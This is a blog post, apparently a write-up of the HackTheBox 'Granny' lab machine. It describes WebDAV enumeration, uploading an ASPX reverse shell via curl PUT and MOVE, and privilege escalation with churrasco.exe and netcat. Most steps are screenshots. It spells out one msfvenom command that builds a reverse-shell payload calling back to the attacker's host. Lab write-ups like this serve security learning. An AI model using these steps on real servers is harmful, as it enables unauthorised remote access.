---
title: "Granny"
date: 2024-07-22
draft: false
description: "HackTheBox Granny writeup"
tags: ["hackthebox", "htb", "windows", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Granny

## Overview

- **OS:** Windows
- **IP:** 10.10.10.15
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

Did w/o metasploit , learnt how to use dataset how to upload files to server using curl , looked at system info found a suitable local exploit, also learnt how to send files from host to write on targets disk ,and then used churasso to escalate privilege and open another remote shell.

## Enumeration


nmap scan result

{{< figure src="Untitled 60.png" >}}

checking for supported http methods

{{< figure src="Untitled 61.png" >}}

**what is webdav?**

Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996

now, on checking the response header we notice that it is being powered by asp.net

{{< figure src="Untitled 62.png" >}}

which tells us that we will be able to execute aspx files on the server

dirbustin results

{{< figure src="Untitled 63.png" >}}

nothing useful found

performing a davtest to check what files can be uploaded

{{< figure src="Untitled 64.png" >}}

{{< figure src="Untitled 65.png" >}}

## Vulnerabilities


Reverse shell through http methods workaround

## Exploitation


ok so we can use the method move , we know that move allows us to rename the file as well , so lets try to put a file then move it rename it to .asp extension and see if that allows us to upload asp files.

cURL, which stands for client URL, is a command line tool that developers use to **transfer data to and from a server**. At the most fundamental, cURL lets you talk to a server by specifying the location (in the form of a URL) and the data you want to send.

By default, `curl` uses the `GET` method, but you can use `-X` to change it to other methods like `POST`, `PUT`, `DELETE`, etc.

{{< figure src="Untitled 66.png" >}}

perfect , now lets try renaming it

{{< figure src="Untitled 67.png" >}}

{{< figure src="Untitled 68.png" >}}

msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx

we use this for making a reverse shell payload which we will upload to the server as a textfile then we will rename that textfile to .asp

{{< figure src="Untitled 69.png" >}}

renaming to aspx

{{< figure src="Untitled 70.png" >}}

on curling

{{< figure src="Untitled 71.png" >}}

we are greeted with this error , lets figure out why

{{< figure src="Untitled 72.png" >}}

on checking the contents of the txt file we notice that its all cluttered and none of the formatting is being saved, lets preserve all that with a simple binary command

{{< figure src="Untitled 73.png" >}}

now lets visit the site

{{< figure src="Untitled 74.png" >}}

great so all the formatting is preserved now

{{< figure src="Untitled 75.png" >}}

and we are in 

{{< figure src="Untitled 76.png" >}}

unfortunately our privilege is still low , lets try escalating it

lets look at our systems info

{{< figure src="Untitled 77.png" >}}

lets look for a exploit 

{{< figure src="Untitled 78.png" >}}

{{< figure src="Untitled 79.png" >}}

{{< figure src="Untitled 80.png" >}}

{{< figure src="Untitled 81.png" >}}

now lets look for a writeable directory on the victims machine

{{< figure src="Untitled 82.png" >}}

{{< figure src="Untitled 83.png" >}}

lets try getting our churrasco.exe file here

{{< figure src="Untitled 84.png" >}}

{{< figure src="Untitled 85.png" >}}

lets get our netcat listener here aswell

{{< figure src="Untitled 86.png" >}}

setting up another listener

{{< figure src="Untitled 87.png" >}}

now lets run the nc listener using churasso

{{< figure src="Untitled 88.png" >}}

{{< figure src="Untitled 89.png" >}}

and boom we have access now lets grab our files

user flag

{{< figure src="Untitled 90.png" >}}

root flag

{{< figure src="Untitled 91.png" >}}
